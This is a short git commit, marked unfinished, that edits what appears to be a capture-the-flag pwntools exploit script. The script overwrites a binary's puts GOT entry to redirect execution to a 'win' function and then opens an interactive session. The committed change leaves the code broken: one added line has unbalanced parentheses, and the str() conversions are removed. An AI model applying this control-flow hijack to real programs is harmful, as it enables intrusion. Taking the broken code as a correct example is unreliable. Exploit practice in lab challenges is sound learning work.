399807a39acb21774f318323f87419b767f3d242
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 21:26:38 -0400

    # NOT FINISHED

--- chall_08/08.py
+++ chall_08/08.py
@@ -1,7 +1,7 @@
 from pwn import *
 binary = context.binary = ELF('./chall_08')
 p = process(binary.path)
-p.sendline(str((binary.got.puts - binary.sym.target) // 8))
-p.sendline(str(binary.sym.win))
+p.sendline(binary.got.puts - binary.sym.target) // 8)
+p.sendline(binary.sym.win)
 p.interactive()
 #NOT FINISHED
